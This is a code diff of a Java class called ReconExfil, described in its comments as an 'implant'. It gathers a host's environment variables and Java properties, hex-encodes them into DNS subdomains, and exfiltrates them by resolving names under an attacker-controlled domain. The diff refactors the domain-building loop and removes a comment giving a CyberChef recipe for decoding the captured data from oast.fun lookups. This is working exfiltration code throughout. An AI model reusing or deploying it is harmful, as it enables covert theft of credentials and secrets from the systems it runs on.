@@ -23,15 +23,15 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
      * DNS specifies a maximum number of 63 characters.
      * A custom value may be set if there are concerns that upstream DNS servers may dislike a large number of
      * subdomains.
-     * Note: This simple implant will just exclude any excess hex digits from an over-sized field (resulting in data
+     * Note: This simple implant will just exclude any excess characters from an over-sized field (resulting in data
      * loss).
      */
     static volatile int CONF_SUBDOMAIN_MAX_LEN = 63;
 
     /**
      * Maximum length of the whole domain name.
-     * DNS specifies a maximum total length of a domain name (all subdomains) of 255. However, there need to be space
-     * for the length octet and a 0, so the actual max length of a domain name is 253.
+     * DNS specifies a maximum total length of a domain name (all subdomains) of 255 characters. However, there need to
+     * be space for the length octet and a 0, so the actual max length of a domain name is 253.
      * A custom value may be set if there are concerns that upstream DNS servers may dislike large requests.
      * Note: This simple implant will just exclude any encoded data fields that does not fit.
      */
@@ -74,20 +74,6 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
 
         String fullExfilDnsName = generateEncodedDomainName(envVars, javaProps);
         resolve(fullExfilDnsName);
-
-        /*
-         * CyberChef recipe to decode the full domain name collected by your DNS server:
-         * 1a) Case-insensitive regex: ([0-9a-fA-F\.]+)\.[0-9]+\.[a-zA-z0-9\-]+\.oast\.fun
-         * 1b) Output the capture group.
-         * 2)  Split by '.' to '\n'
-         * 3)  Fork. Split delimiter '\n'. Merge delimiter '\n'.
-         * 4)  From hex.
-         *
-         * Here's a link:
-         * https://gchq.github.io/CyberChef/#recipe=Regular_expression('User%20defined','(%5B0-9a-fA-F%5C%5C.%5D%2B)%5C%5C.%5B0-9%5D%2B%5C%5C.%5Ba-zA-z0-9%5C%5C-%5D%2B%5C%5C.oast%5C%5C.fun',true,true,true,false,false,false,'List%20capture%20groups')Split('.','%5C%5Cn')Fork('%5C%5Cn','%5C%5Cn',false)From_Hex('Auto')
-         *
-         * Just paste in any collected DNS requests. Make sure to get the "last" one with all the subdomains in it.
-         */
     }
 
     String generateEncodedDomainName(Map<String, String> envVars, Properties javaProps) {
@@ -104,15 +90,16 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         encodedParts.add(encode(runtimeInfo));
 
         String lastPart = uniqueId + "." + CONF_EXFIL_DNS;
-        StringBuilder domainName = new StringBuilder();
+        StringBuilder domainBuilder = new StringBuilder();
         for (String encodedPart : encodedParts) {
-            if (encodedPart.length() + 1 + domainName.length() + lastPart.length() <= CONF_DOMAIN_MAX_LEN) {
-                domainName.append(encodedPart).append(".");
+            String addEncodedPart = encodedPart + ".";
+            if (addEncodedPart.length() + domainBuilder.length() + lastPart.length() <= CONF_DOMAIN_MAX_LEN) {
+                domainBuilder.append(addEncodedPart);
             }
         }
-        domainName.append(lastPart);
+        domainBuilder.append(lastPart);
 
-        return domainName.toString();
+        return domainBuilder.toString();
     }
 
     // Just hex represent it for now. This is very space inefficient, but at least it's compatible with DNS.
